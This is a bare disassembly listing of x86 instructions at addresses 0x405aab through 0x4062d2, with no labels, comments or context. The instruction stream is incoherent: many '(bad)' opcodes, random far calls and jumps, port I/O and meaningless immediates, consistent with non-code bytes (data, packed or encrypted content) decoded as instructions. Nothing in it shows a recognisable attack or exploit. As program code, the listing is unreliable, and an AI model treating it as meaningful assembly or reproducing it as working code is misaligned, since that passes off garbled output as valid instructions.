  405aab:	mov    ebx,0x90c60c60
  405ab0:	in     al,0xec
  405ab2:	xor    al,ah
  405ab4:	mov    eax,ds:0x9ec1ac6c
  405ab9:	gs jnp 0x405a41
  405abc:	push   cs
  405abd:	sub    DWORD PTR [eax],0xffffffe4
  405ac0:	popf   
  405ac1:	lds    edi,FWORD PTR [edi+0x1f3f277]
  405ac7:	push   0xfffffff9
  405ac9:	dec    esp
  405aca:	repz cmp edi,esp
  405acd:	cdq    
  405ace:	add    eax,0xb44e381e
  405ad3:	icebp  
  405ad4:	scas   eax,DWORD PTR es:[edi]
  405ad5:	test   DWORD PTR [ebx],eax
  405ad7:	adc    eax,0x25f81f0f
  405adc:	and    cl,dh
  405ade:	adc    eax,0xef18632e
  405ae3:	inc    ebp
  405ae4:	pop    es
  405ae5:	xlat   BYTE PTR ds:[ebx]
  405ae6:	fstsw  WORD PTR [ecx+0x5da46d87]
  405aed:	pusha  
  405aee:	mov    dh,0xde
  405af0:	cmp    dl,ah
  405af2:	pop    esi
  405af3:	lea    ebp,[ebx]
  405af5:	jp     0x405ab4
  405af7:	fmul   DWORD PTR [ebp-0x5d0e026d]
  405afd:	loopne 0x405b2b
  405aff:	pop    edx
  405b00:	pop    ss
  405b01:	inc    edx
  405b02:	sub    eax,0x33ebd428
  405b07:	mov    edi,0x5d9a15f8
  405b0c:	mov    gs,WORD PTR [ebx+0x3361b102]
  405b12:	push   ebp
  405b13:	inc    esi
  405b14:	push   esp
  405b15:	mov    al,0xa2
  405b17:	or     bl,dl
  405b19:	fadd   DWORD PTR [ecx-0x69]
  405b1c:	dec    esi
  405b1d:	adc    esp,DWORD PTR [ebx+0x6da885d6]
  405b23:	fwait
  405b24:	push   ebp
  405b25:	ja     0x405af0
  405b27:	mov    BYTE PTR [eax-0x359eb020],dh
  405b2d:	jae    0x405acc
  405b2f:	scas   eax,DWORD PTR es:[edi]
  405b30:	mov    eax,ds:0x61b47fd5
  405b35:	add    esi,DWORD PTR [eax-0x589951b1]
  405b3b:	mov    al,0x14
  405b3d:	ins    DWORD PTR es:[edi],dx
  405b3e:	loop   0x405b19
  405b40:	mov    edx,0xdf03e28d
  405b45:	push   ecx
  405b46:	daa    
  405b47:	mov    BYTE PTR [ecx+eax*4+0x3b4f8d23],ah
  405b4e:	fwait
  405b4f:	retf   
  405b50:	nop
  405b51:	adc    BYTE PTR [edx],ah
  405b53:	pop    esp
  405b54:	rcr    ch,1
  405b56:	push   es
  405b57:	(bad)  
  405b58:	adc    eax,0x2433f749
  405b5d:	out    0x26,eax
  405b5f:	ins    DWORD PTR es:[edi],dx
  405b60:	xor    bl,BYTE PTR [ebx+0x43]
  405b63:	sub    al,0xe3
  405b65:	lds    eax,FWORD PTR [edi]
  405b67:	aam    0x14
  405b69:	push   0x1afb6d53
  405b6e:	or     eax,0xac726064
  405b73:	push   0x2
  405b75:	mov    WORD PTR [edi],cs
  405b77:	dec    esi
  405b78:	adc    DWORD PTR [ebp-0x232e8ef1],ebp
  405b7e:	pop    es
  405b7f:	js     0x405ba9
  405b81:	arpl   si,si
  405b83:	repnz loopne 0x405b6c
  405b86:	daa    
  405b87:	ins    BYTE PTR es:[edi],dx
  405b88:	xor    ebx,DWORD PTR [edx-0x6d]
  405b8b:	sub    eax,0x6affc4e2
  405b90:	adc    eax,0xf02b22f3
  405b95:	retf   0x650c
  405b98:	popa   
  405b99:	jb     0x405b74
  405b9b:	cmp    BYTE PTR [esi],ah
  405b9d:	mov    ebx,DWORD PTR ds:0xb10d6f3e
  405ba3:	lock test al,0x96
  405ba6:	sbb    DWORD PTR [ebx],esp
  405ba8:	daa    
  405ba9:	sbb    BYTE PTR [ebx+0x44e2b718],dh
  405baf:	jne    0x405bd1
  405bb1:	sbb    esp,DWORD PTR [esi-0x626cde37]
  405bb7:	mov    esp,ds
  405bb9:	mov    ds:0x1249d11b,al
  405bbe:	(bad)  
  405bbf:	cdq    
  405bc0:	into   
  405bc1:	mov    eax,ds:0x3ce3c110
  405bc6:	(bad)  
  405bc7:	mov    ah,ch
  405bc9:	mov    dl,BYTE PTR [ebp-0x10abd10f]
  405bcf:	mov    edi,0xf8209ce0
  405bd4:	cmp    eax,0xee8c8d0e
  405bd9:	mov    dh,BYTE PTR [ecx]
  405bdb:	cmc    
  405bdc:	aas    
  405bdd:	add    BYTE PTR [ecx-0x5e],cl
  405be0:	mov    ds:0xb7b36fa9,al
  405be5:	adc    dh,BYTE PTR [eax+0x11e59dd0]
  405beb:	mov    eax,ds:0x972265c2
  405bf0:	mov    al,0x70
  405bf2:	xlat   BYTE PTR ds:[ebx]
  405bf3:	popf   
  405bf4:	push   edi
  405bf5:	add    DWORD PTR [ebp+ecx*8-0x8d1666b],ebp
  405bfc:	sbb    BYTE PTR [ecx],al
  405bfe:	ffreep st(2)
  405c00:	sar    BYTE PTR [edi+0x1d274d3f],0xc5
  405c07:	test   al,0xcb
  405c09:	jg     0x405c3e
  405c0b:	mov    al,0x86
  405c0d:	or     ebp,DWORD PTR [edi]
  405c0f:	stos   DWORD PTR es:[edi],eax
  405c10:	ds ret 0xf
  405c14:	fistp  DWORD PTR [esi]
  405c16:	retf   
  405c17:	xchg   ebx,eax
  405c18:	fld    DWORD PTR [edx-0x72e71d43]
  405c1e:	in     eax,dx
  405c1f:	das    
  405c20:	test   DWORD PTR [ebx-0x6fcb78da],ebp
  405c26:	add    cl,BYTE PTR [ecx+0x7400a5cd]
  405c2c:	mov    al,ds:0x62b11af8
  405c31:	mov    edi,0x54138f12
  405c36:	push   0xffffffb8
  405c38:	shr    DWORD PTR [eax+0x2009d723],cl
  405c3e:	test   al,0xf0
  405c41:	mov    ds:0x5d1d9806,al
  405c46:	jb     0x405cae
  405c48:	or     eax,0x51dc165
  405c4d:	mov    DWORD PTR [edx],0x1fa4f973
  405c53:	mov    DWORD PTR [esi],0xca88f1b4
  405c59:	adc    bl,BYTE PTR [ecx+0x75]
  405c5c:	and    ebx,DWORD PTR [edi]
  405c5e:	shl    BYTE PTR [ecx+0x293481e8],cl
  405c64:	add    DWORD PTR [ebp-0x6],ebx
  405c67:	(bad)  
  405c68:	pop    ecx
  405c69:	xor    eax,0x2f39f982
  405c6e:	sub    BYTE PTR [esi+0x4dd7f3f],0xda
  405c75:	repz and eax,0xdc5e4fae
  405c7b:	or     eax,0x412ee8c8
  405c80:	enter  0xe338,0xf9
  405c84:	leave  
  405c85:	xchg   esp,eax
  405c86:	adc    BYTE PTR [edi+0xb],0x27
  405c8a:	pushf  
  405c8b:	dec    edx
  405c8c:	mov    ds:0x49137402,eax
  405c91:	and    eax,0xfe93549f
  405c96:	mov    bh,0xf
  405c98:	in     al,0x2d
  405c9a:	(bad)  
  405c9b:	dec    esi
  405c9c:	pop    esi
  405c9d:	arpl   bx,ax
  405c9f:	jnp    0x405ca3
  405ca1:	jl     0x405c6d
  405ca3:	add    dl,bl
  405ca5:	call   0x4bfc75af
  405caa:	xor    eax,0x3df6d7f1
  405caf:	push   es
  405cb0:	and    esp,DWORD PTR [ebx-0x37]
  405cb3:	add    al,0x1b
  405cb5:	sti    
  405cb6:	lods   eax,DWORD PTR ds:[esi]
  405cb8:	cmp    ebx,0x48
  405cbb:	mov    WORD PTR [edx+edi*4-0x46],?
  405cbf:	ror    dl,0x20
  405cc2:	pop    es
  405cc3:	retf   0x6146
  405cc6:	(bad)  
  405cc8:	mov    al,BYTE PTR [ecx+0x4c]
  405ccb:	ror    DWORD PTR [edi-0xe],0xaa
  405ccf:	ja     0x405c6c
  405cd1:	jge    0x405cee
  405cd3:	mov    es,ecx
  405cd5:	outs   dx,DWORD PTR ds:[esi]
  405cd6:	ret    
  405cd7:	fstp   DWORD PTR [ecx+0x2eba69c8]
  405cdd:	pop    ss
  405cde:	bnd jae 0x405cd5
  405ce1:	xchg   DWORD PTR [esi+esi*8+0x2c],esi
  405ce5:	pxor   mm0,QWORD PTR [ebp-0x41859366]
  405cec:	push   ecx
  405ced:	jb     0x405ce9
  405cef:	in     al,0xa6
  405cf1:	sbb    esi,DWORD PTR [eax]
  405cf3:	out    0xe0,eax
  405cf5:	push   edi
  405cf6:	call   0x1d93:0x622db8e9
  405cfd:	sub    bh,al
  405cff:	cmp    al,0xb8
  405d02:	sbb    al,0xca
  405d04:	dec    ecx
  405d05:	es and bh,0xdf
  405d09:	out    0xb3,al
  405d0b:	in     eax,0x2d
  405d0d:	jle    0x405cc5
  405d0f:	retf   
  405d10:	test   al,0xb0
  405d12:	mov    ds:0xe92d1af2,eax
  405d17:	xchg   ebx,eax
  405d18:	in     eax,dx
  405d19:	sub    eax,0xa301df1b
  405d1e:	add    DWORD PTR [edx-0x50e95f2d],esi
  405d24:	cvtps2pd xmm6,xmm4
  405d27:	fdivrp st(4),st
  405d29:	jecxz  0x405ccf
  405d2b:	rcl    BYTE PTR [ecx],0x34
  405d2e:	mov    ecx,0x19bac27f
  405d33:	xchg   ecx,eax
  405d34:	mov    DWORD PTR ds:0xb4e6a69d,edi
  405d3a:	and    ah,dh
  405d3c:	cmp    dl,BYTE PTR [ebp-0x75]
  405d3f:	cmp    eax,0x9e791dad
  405d44:	dec    edx
  405d45:	ins    DWORD PTR es:[edi],dx
  405d46:	retf   
  405d47:	push   ss
  405d48:	mov    ch,0xe5
  405d4a:	add    al,0x21
  405d4c:	cmp    eax,0xdefa9f01
  405d51:	and    BYTE PTR [ecx],0xb2
  405d54:	sbb    bl,bl
  405d56:	sahf   
  405d57:	mov    al,ds:0xb247e9da
  405d5c:	dec    eax
  405d5d:	push   0xffffff89
  405d5f:	xor    eax,0x7a565eaf
  405d64:	inc    ebp
  405d65:	pop    es
  405d66:	(bad)  
  405d67:	(bad)  
  405d69:	or     ebp,DWORD PTR ds:0x9c615287
  405d6f:	popa   
  405d70:	into   
  405d71:	mov    esi,0x6ca38f7d
  405d76:	popf   
  405d77:	out    0xfd,al
  405d79:	xchg   ecx,eax
  405d7a:	push   es
  405d7b:	ror    bh,cl
  405d7d:	dec    ebx
  405d7e:	jp     0x405d98
  405d80:	mov    ah,bh
  405d82:	sbb    esp,DWORD PTR [ebx-0x4f366c99]
  405d88:	mov    ah,0xde
  405d8a:	jg     0x405d48
  405d8c:	push   0xfae19129
  405d91:	sahf   
  405d92:	bound  esp,QWORD PTR [edi-0x1450b39f]
  405d98:	hlt    
  405d99:	and    BYTE PTR [ebx+0x6c348548],cl
  405d9f:	cmp    edi,DWORD PTR [ebx-0x18ad61d8]
  405da5:	icebp  
  405da6:	das    
  405da7:	dec    ebx
  405da8:	add    eax,0x9920923e
  405dad:	loop   0x405dd5
  405daf:	jns    0x405ddc
  405db1:	call   0xee4d:0xe905782
  405db8:	pop    edx
  405db9:	xor    ebp,DWORD PTR [ecx+0x578fef34]
  405dbf:	test   eax,0x60641c9a
  405dc4:	arpl   dx,bx
  405dc6:	push   ebp
  405dc7:	cs push 0x73
  405dca:	add    BYTE PTR [edi+0x215828a8],0x79
  405dd1:	adc    DWORD PTR [edi+0x798cbb5a],edi
  405dd7:	cmp    esi,DWORD PTR [edx+0x59]
  405dda:	mov    ds:0x3bf12d15,eax
  405ddf:	jle    0x405dfe
  405de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405de2:	retf   0x851f
  405de5:	shl    BYTE PTR [edx+0x4f],cl
  405de8:	ds push 0xa6c5cdd2
  405dee:	pop    edi
  405def:	cmp    eax,0xec9456f
  405df4:	retf   0x27d8
  405df7:	dec    edx
  405df8:	cli    
  405df9:	ja     0x405dd0
  405dfb:	dec    eax
  405dfc:	xchg   ebx,eax
  405dfd:	repz or esp,DWORD PTR [eax+0x21]
  405e01:	mov    esp,0xc03030fe
  405e06:	inc    edi
  405e07:	lock pop edx
  405e09:	inc    edx
  405e0a:	fsub   QWORD PTR [ebx]
  405e0c:	hlt    
  405e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e0e:	adc    ebx,ebp
  405e10:	xor    BYTE PTR [ebp-0x7c],ah
  405e13:	mov    cs,WORD PTR [ebp+ecx*8-0x7b]
  405e17:	outs   dx,BYTE PTR ds:[esi]
  405e18:	ds data16 mov cl,0x6c
  405e1c:	mov    bl,0xc6
  405e1e:	out    dx,eax
  405e1f:	(bad)  
  405e20:	cli    
  405e21:	mov    eax,0x54519009
  405e26:	sbb    DWORD PTR [edi-0x3bff6834],0x3c
  405e2d:	adc    ebp,DWORD PTR ds:0x5ff0c088
  405e33:	fstp   QWORD PTR [ebx+0x122e7204]
  405e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e3a:	retf   
  405e3b:	mov    BYTE PTR [esp+esi*1-0x47],bl
  405e3f:	mov    ss,edx
  405e41:	mov    dh,0x3d
  405e43:	add    DWORD PTR [ebx+0x16],edx
  405e46:	sub    BYTE PTR [edx-0x1bdc71f0],bl
  405e4c:	and    DWORD PTR [eax],edx
  405e4e:	(bad)  
  405e4f:	mov    esi,0xb92dd7fc
  405e54:	xor    eax,0x8788fcf5
  405e59:	(bad)  
  405e5a:	xor    al,0xa9
  405e5c:	ja     0x405e90
  405e5e:	mov    ds,WORD PTR [ebx]
  405e60:	sti    
  405e61:	call   0x81c7:0x2704995c
  405e68:	clc    
  405e69:	inc    esp
  405e6a:	sbb    ebx,edi
  405e6c:	aas    
  405e6d:	out    0x94,eax
  405e6f:	out    dx,al
  405e70:	jo     0x405ea6
  405e72:	mov    al,0x54
  405e74:	or     edi,DWORD PTR [eax+0x38ca6b65]
  405e7a:	mov    ecx,gs
  405e7c:	mov    bh,0xa4
  405e7e:	imul   ebx,esp,0x5b
  405e81:	jo     0x405e59
  405e83:	pop    ss
  405e84:	dec    edx
  405e85:	ret    
  405e86:	lds    eax,FWORD PTR [ebx-0x2ee44a2c]
  405e8c:	pop    ss
  405e8d:	sub    eax,0xb8e6d5eb
  405e92:	sbb    cl,dh
  405e94:	push   cs
  405e95:	mov    ds:0x68cb6362,al
  405e9a:	jecxz  0x405ecd
  405e9c:	sar    BYTE PTR [ebx],0x37
  405e9f:	dec    ecx
  405ea0:	push   ecx
  405ea1:	mov    cl,cl
  405ea3:	daa    
  405ea4:	loopne 0x405ea4
  405ea6:	fcom   QWORD PTR [edx]
  405ea8:	pushw  0xffd8
  405eab:	repz sub DWORD PTR [ebx+edx*4],ebx
  405eaf:	loop   0x405e39
  405eb1:	mov    al,ds:0xecc23927
  405eb6:	cmp    BYTE PTR [esi-0x5e],bl
  405eb9:	fbld   TBYTE PTR [edi]
  405ebb:	repz shl BYTE PTR [ebx],0x88
  405ebf:	jmp    0xe76d0bb8
  405ec4:	and    eax,0xe9adc953
  405ec9:	fstp   QWORD PTR [edi]
  405ecb:	push   cs
  405ecc:	sti    
  405ecd:	add    edx,eax
  405ecf:	xchg   ebp,eax
  405ed0:	neg    BYTE PTR [edi+0x6571865a]
  405ed6:	fldcw  WORD PTR [edi-0x34f16419]
  405edc:	push   ebx
  405edd:	push   edx
  405ede:	stos   DWORD PTR es:[edi],eax
  405edf:	jne    0x405ed5
  405ee1:	aad    0x4b
  405ee3:	mov    ebx,0x7d7a1372
  405ee8:	inc    eax
  405ee9:	cmp    al,cl
  405eeb:	mov    fs:0xc152e8d,al
  405ef1:	pop    esp
  405ef2:	popf   
  405ef3:	leave  
  405ef4:	call   DWORD PTR [ebx]
  405ef6:	aas    
  405ef7:	or     BYTE PTR [esi+0x5],ch
  405efa:	mov    eax,0x1703f239
  405eff:	and    cl,BYTE PTR [esi]
  405f01:	aad    0x97
  405f03:	mov    al,0x2d
  405f05:	xor    eax,edi
  405f07:	mov    eax,ds:0x91c4d9fb
  405f0c:	sub    al,0x22
  405f0e:	enter  0xf4d8,0x93
  405f12:	cmp    BYTE PTR [edx+edx*2+0x4e6f1227],dh
  405f19:	sbb    eax,0x20d368d
  405f1e:	(bad)  
  405f1f:	sbb    bh,al
  405f21:	out    dx,eax
  405f22:	pop    ebx
  405f23:	mov    WORD PTR [ebx+esi*8],es
  405f26:	ror    eax,0x93
  405f29:	test   DWORD PTR [eax-0xe],0x92fb764c
  405f30:	mov    ?,edi
  405f32:	stos   DWORD PTR es:[edi],eax
  405f33:	xchg   DWORD PTR [esi+0x60],ecx
  405f36:	aaa    
  405f37:	(bad)  
  405f39:	cdq    
  405f3a:	ret    
  405f3b:	call   0xd6d6:0xce92dc9b
  405f42:	mov    ebx,0xb229c6a6
  405f47:	(bad)  
  405f48:	pop    esp
  405f49:	push   ds
  405f4a:	mov    dl,0xc8
  405f4c:	mov    eax,ds:0x6d2f4395
  405f51:	and    al,0x92
  405f53:	addr16 mov esi,0xf5265133
  405f59:	adc    BYTE PTR [eax+0x424e9861],ah
  405f5f:	and    BYTE PTR [ebp+0x8],bh
  405f62:	mov    ecx,0x6f29906e
  405f67:	xor    ah,BYTE PTR [ebp+0x1c]
  405f6a:	lods   al,BYTE PTR ds:[esi]
  405f6b:	jle    0x405ef0
  405f6d:	xchg   edx,eax
  405f6e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f70:	sub    BYTE PTR [edi],bh
  405f72:	stos   DWORD PTR es:[edi],eax
  405f73:	das    
  405f74:	les    eax,FWORD PTR [ecx]
  405f76:	jb     0x405f21
  405f78:	imul   DWORD PTR [edi+edx*4]
  405f7b:	pavgb  mm6,mm4
  405f7e:	push   edi
  405f7f:	or     cl,BYTE PTR [edx+0x32]
  405f82:	mov    BYTE PTR [edx-0x39],dl
  405f85:	scas   eax,DWORD PTR es:[edi]
  405f86:	ret    
  405f87:	cmp    al,0x69
  405f89:	and    al,BYTE PTR [esi+0x1ffbe55e]
  405f8f:	ins    DWORD PTR es:[edi],dx
  405f90:	mov    eax,0xc571f7cd
  405f95:	out    0x3f,al
  405f97:	jg     0x405f9d
  405f99:	stos   DWORD PTR es:[edi],eax
  405f9a:	fadd   QWORD PTR ds:0x2f2d03bf
  405fa0:	out    0xa5,eax
  405fa2:	or     eax,ecx
  405fa4:	add    eax,DWORD PTR [ecx-0x60294708]
  405faa:	sub    edi,edi
  405fac:	push   edi
  405fad:	and    eax,DWORD PTR [ebx]
  405faf:	popf   
  405fb0:	aam    0xbd
  405fb2:	or     BYTE PTR [ecx],dh
  405fb4:	aaa    
  405fb5:	daa    
  405fb6:	stc    
  405fb7:	add    edi,0x3c32cfd
  405fbd:	data16 aad 0x33
  405fc0:	mov    BYTE PTR ds:0xc2aec22,0xf4
  405fc7:	xchg   ebp,eax
  405fc8:	loopne 0x40602e
  405fca:	add    edi,DWORD PTR [ebx+0x24]
  405fcd:	inc    edx
  405fce:	ficomp WORD PTR [esi-0xa876f36]
  405fd4:	jp     0x406019
  405fd6:	call   0x2060:0x8e3193f4
  405fdd:	test   al,0x75
  405fdf:	sbb    eax,DWORD PTR [esi+0x31]
  405fe2:	xchg   ebp,eax
  405fe3:	jno    0x405fd8
  405fe5:	(bad)  
  405fe6:	and    eax,0xa6750e97
  405feb:	push   es
  405fec:	ret    0x5c4
  405fef:	ins    DWORD PTR es:[edi],dx
  405ff0:	cmp    DWORD PTR [eax-0x6f],0xf
  405ff4:	arpl   WORD PTR [ecx+0x24],si
  405ff7:	arpl   sp,si
  405ff9:	pop    esp
  405ffa:	ficom  DWORD PTR [ebx]
  405ffc:	ror    ebp,cl
  405ffe:	rcl    DWORD PTR [ecx+0x17],0x3d
  406002:	stc    
  406003:	push   ss
  406004:	ins    BYTE PTR es:[edi],dx
  406005:	aaa    
  406006:	push   cs
  406007:	jle    0x406083
  406009:	jns    0x405fe3
  40600b:	pop    es
  40600c:	out    dx,al
  40600d:	icebp  
  40600e:	sbb    ch,BYTE PTR [ecx+0x39e54538]
  406014:	retf   
  406015:	frstor [edi+0x69]
  406018:	sub    eax,0x7783a885
  40601d:	push   ecx
  40601e:	xchg   edx,eax
  40601f:	(bad)  
  406020:	cld    
  406021:	adc    DWORD PTR [esi+esi*4+0x6d],0x5ea9525e
  406029:	sbb    al,0xb0
  40602b:	jno    0x405fd4
  40602d:	and    eax,DWORD PTR [ecx+0x3b]
  406030:	pop    ecx
  406031:	ss ds gs mov esp,0x6d24429a
  406039:	add    al,0xb1
  40603b:	dec    eax
  40603c:	mov    cs,WORD PTR [esi]
  40603e:	dec    edi
  40603f:	cmp    BYTE PTR [esi+0x39],bh
  406042:	and    al,0x7a
  406044:	mov    edx,0x64606cdf
  406049:	lds    ebx,FWORD PTR [ebx+0x4db59355]
  40604f:	xor    DWORD PTR [edx],edx
  406051:	cmp    al,0xb5
  406053:	loopne 0x405ff9
  406055:	ret    
  406056:	sbb    al,0x72
  406058:	jmp    0x872:0xe029fa49
  40605f:	mov    bh,0xa2
  406061:	ret    
  406062:	jns    0x405fec
  406064:	add    BYTE PTR [ebx-0x2a],ah
  406067:	lods   eax,DWORD PTR ds:[esi]
  406068:	jmp    0xbcab:0x69d9eb92
  40606f:	mov    ebp,0xe426c8fa
  406074:	popa   
  406075:	popa   
  406076:	aam    0xe9
  406078:	loopne 0x4060b9
  40607a:	mov    ebx,0x9b4f7cf2
  40607f:	adc    BYTE PTR [esp+edi*8-0x2cbc8a51],0x7f
  406087:	rcr    DWORD PTR [esi+0x508022e0],0x67
  40608e:	mov    ah,0x97
  406090:	int3   
  406091:	call   DWORD PTR [ebx+0x5a]
  406094:	pop    esi
  406095:	ins    BYTE PTR es:[edi],dx
  406096:	mov    ch,0x4c
  406098:	lds    ecx,FWORD PTR [esi+ecx*1-0x5d95ec3b]
  40609f:	add    BYTE PTR [esi],0x64
  4060a2:	and    al,0x13
  4060a4:	les    eax,FWORD PTR [ebx+0x51e96912]
  4060aa:	sti    
  4060ab:	pop    ecx
  4060ac:	call   0x21ef7973
  4060b1:	dec    edx
  4060b2:	out    dx,al
  4060b3:	cmp    ebp,ebx
  4060b5:	mov    es,WORD PTR [edx+0x59]
  4060b8:	sub    al,BYTE PTR [ebx-0x3]
  4060bb:	xor    dl,ch
  4060bd:	sar    DWORD PTR [edx],1
  4060bf:	cmp    ch,BYTE PTR [edx-0x25]
  4060c2:	aas    
  4060c3:	push   ss
  4060c4:	xchg   esp,eax
  4060c5:	test   eax,0x640a4e47
  4060ca:	and    esp,DWORD PTR [ecx+edx*8]
  4060cd:	(bad)  
  4060ce:	cmp    DWORD PTR [ebx],ecx
  4060d0:	inc    ecx
  4060d1:	lods   eax,DWORD PTR ds:[esi]
  4060d2:	pushf  
  4060d3:	sbb    DWORD PTR [esi+0x2460aad3],esp
  4060d9:	pop    eax
  4060da:	jecxz  0x40610f
  4060dc:	cmp    eax,0xc0720ada
  4060e1:	test   al,ch
  4060e3:	jp     0x4060dd
  4060e5:	pushf  
  4060e6:	adc    al,0x79
  4060e8:	adc    edx,DWORD PTR [esi]
  4060ea:	cli    
  4060eb:	and    bl,ah
  4060ed:	mov    ds:0xb43f6356,eax
  4060f2:	stc    
  4060f3:	and    DWORD PTR [edi],esp
  4060f5:	into   
  4060f6:	pop    ss
  4060f7:	imul   edx,DWORD PTR [ecx],0xffffffd4
  4060fa:	mov    bl,0x1
  4060fc:	retf   
  4060fd:	jae    0x4060d7
  4060ff:	cmp    ch,ah
  406101:	or     ch,BYTE PTR [edx-0x6460cf1]
  406107:	mov    eax,0xe82c85ee
  40610c:	xor    BYTE PTR [ecx],bl
  40610e:	nop
  40610f:	mov    dh,dl
  406111:	xchg   edi,edx
  406113:	mov    edi,0xaa914628
  406118:	lahf   
  406119:	gs mov cl,0x1c
  40611c:	lds    ebx,FWORD PTR [ebx+0x4f]
  40611f:	(bad)  
  406120:	dec    DWORD PTR [esi]
  406122:	mov    ds:0x56f3a27e,eax
  406127:	stos   BYTE PTR es:[edi],al
  406128:	hlt    
  406129:	inc    DWORD PTR [ecx-0x69]
  40612c:	inc    edi
  40612d:	xor    BYTE PTR [ebp+0x5292f6c9],bh
  406133:	out    0x5a,al
  406135:	adc    DWORD PTR [eax+0x65949bc3],ebp
  40613b:	add    DWORD PTR ds:0xf12568ee,ecx
  406141:	push   ebx
  406142:	stos   DWORD PTR es:[edi],eax
  406143:	icebp  
  406144:	mov    edi,0x4c1b52b1
  406149:	outs   dx,DWORD PTR ds:[esi]
  40614a:	xor    cl,0xcf
  40614d:	in     al,0x2f
  40614f:	xor    al,0x3a
  406151:	jl     0x7df89eb6
  406157:	sbb    bh,BYTE PTR ds:0x35b810b
  40615d:	mov    al,ds:0x85663164
  406162:	jecxz  0x40618e
  406164:	cli    
  406165:	mov    ebp,0x17691036
  40616a:	and    esp,DWORD PTR [esi-0x60]
  40616d:	xchg   ebx,eax
  40616e:	sbb    bl,BYTE PTR ds:0xc9a50e63
  406174:	lods   eax,DWORD PTR ds:[esi]
  406175:	xchg   ecx,eax
  406176:	inc    edx
  406177:	and    al,0x2e
  406179:	dec    edx
  40617a:	out    0x43,al
  40617c:	retf   
  40617d:	mov    ds:0x5dc29ad,eax
  406182:	aad    0x40
  406184:	into   
  406185:	mov    dl,0x36
  406187:	scas   al,BYTE PTR es:[edi]
  406188:	dec    esi
  406189:	and    DWORD PTR [esp+eax*2+0x4f74bbc7],ebx
  406190:	stc    
  406191:	sbb    ah,bh
  406193:	add    ecx,ebp
  406195:	(bad)  
  406196:	cmp    dh,BYTE PTR [esi]
  406198:	add    al,0x32
  40619a:	(bad)  
  40619b:	sti    
  40619c:	mov    eax,eax
  40619e:	dec    ecx
  40619f:	jns    0x4061c9
  4061a1:	mov    dl,ah
  4061a3:	push   edi
  4061a4:	rol    ch,0xb
  4061a7:	popa   
  4061a8:	jb     0x4061ad
  4061aa:	mov    esi,0x78df236a
  4061af:	cmp    bh,BYTE PTR [ebx]
  4061b1:	data16 fcom DWORD PTR [edi]
  4061b4:	shr    DWORD PTR [edx+0x55],0xaf
  4061b8:	xor    bl,BYTE PTR [ebx-0x17]
  4061bb:	test   BYTE PTR [bx-0x3cb8],dh
  4061c0:	(bad)  
  4061c1:	mov    ds:0x5f0b0b11,eax
  4061c6:	pop    edx
  4061c7:	fdiv   st(2),st
  4061c9:	xlat   BYTE PTR ds:[ebx]
  4061ca:	cmp    ch,ah
  4061cc:	sub    BYTE PTR [ebx+ebx*4],cl
  4061cf:	mov    al,0xf3
  4061d1:	jno    0x4061fe
  4061d3:	bnd jge 0x40622a
  4061d6:	cmp    DWORD PTR [eax+edx*4+0x23cf88ec],0xb7f38b2a
  4061e1:	retf   0xbf6b
  4061e4:	outs   dx,DWORD PTR ds:[esi]
  4061e5:	sbb    eax,0xfe8eadb7
  4061ea:	and    esp,ebx
  4061ec:	xor    al,BYTE PTR [esi-0x44]
  4061ef:	mov    ch,0xc5
  4061f1:	mov    ch,BYTE PTR ds:0xca0d4671
  4061f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061f8:	mov    ecx,0x6ec7639c
  4061fd:	push   ebp
  4061fe:	xor    DWORD PTR [edx-0x75],0x3d
  406202:	push   esi
  406203:	inc    esp
  406204:	and    dl,BYTE PTR [edi+0x74722b3e]
  40620a:	(bad)  
  40620b:	adc    DWORD PTR [ebx],eax
  40620d:	and    dh,BYTE PTR [esi]
  40620f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406210:	add    al,0x78
  406212:	call   0x6312:0x38742263
  406219:	push   ecx
  40621a:	ret    0x2304
  40621d:	jecxz  0x406293
  40621f:	inc    ebx
  406220:	push   ds
  406221:	dec    ebx
  406222:	out    dx,al
  406223:	js     0x40621c
  406225:	icebp  
  406226:	dec    esi
  406227:	jb     0x406231
  406229:	jecxz  0x406226
  40622b:	adc    DWORD PTR [ebx-0x5e28834],esp
  406231:	dec    ecx
  406232:	clc    
  406233:	ins    DWORD PTR es:[edi],dx
  406234:	mov    cl,0xf2
  406236:	push   ecx
  406237:	xor    DWORD PTR [edx],ebx
  406239:	test   BYTE PTR [ebp+0x4ad5b264],dh
  40623f:	or     BYTE PTR [eax+0x7d],bl
  406242:	jmp    0x3cd084c5
  406247:	sub    al,0x76
  406249:	je     0x4061ed
  40624b:	jne    0x406243
  40624d:	les    eax,FWORD PTR [edx-0x2190949b]
  406253:	call   FWORD PTR [ebp-0x2becf25d]
  406259:	inc    edi
  40625a:	lea    eax,[edx+0x3]
  40625d:	div    DWORD PTR [esi+esi*1+0x7a]
  406261:	and    ebx,DWORD PTR [bx]
  406264:	mov    bh,al
  406266:	xor    eax,0x8073044b
  40626b:	inc    DWORD PTR [ecx-0x7af4c849]
  406271:	add    al,0xb6
  406273:	jle    0x406229
  406275:	retf   0xde58
  406278:	adc    BYTE PTR [ecx],0xc1
  40627b:	and    bl,BYTE PTR [edi+0x7a2ac2af]
  406281:	push   eax
  406282:	jmp    0x4062c3
  406284:	mov    eax,0x72800960
  406289:	push   es
  40628a:	jecxz  0x40627a
  40628c:	loopne 0x4062cf
  40628e:	cs scas al,BYTE PTR es:[edi]
  406290:	rol    DWORD PTR [edi],1
  406292:	out    0x4e,al
  406294:	and    BYTE PTR [edx-0x7c4efb76],0xdd
  40629b:	or     DWORD PTR [edx+0x43d23ee2],eax
  4062a1:	test   eax,0x5d5f0498
  4062a6:	sbb    eax,0x86055df0
  4062ab:	dec    ebp
  4062ac:	test   DWORD PTR [esi+0x2af60771],eax
  4062b2:	mov    BYTE PTR [edi+edx*4+0x37],bl
  4062b6:	mov    ah,0xb2
  4062b8:	scas   eax,DWORD PTR es:[edi]
  4062b9:	into   
  4062ba:	pusha  
  4062bb:	jbe    0x406329
  4062bd:	push   esi
  4062be:	stos   BYTE PTR es:[edi],al
  4062bf:	stc    
  4062c0:	mov    ah,0x5
  4062c2:	imul   ecx,DWORD PTR [ebx-0x106fb097],0x62
  4062c9:	mov    eax,ds:0x9903cb81
  4062ce:	and    al,0xb
  4062d0:	mov    BYTE PTR [esi],dh
  4062d2:	int3   
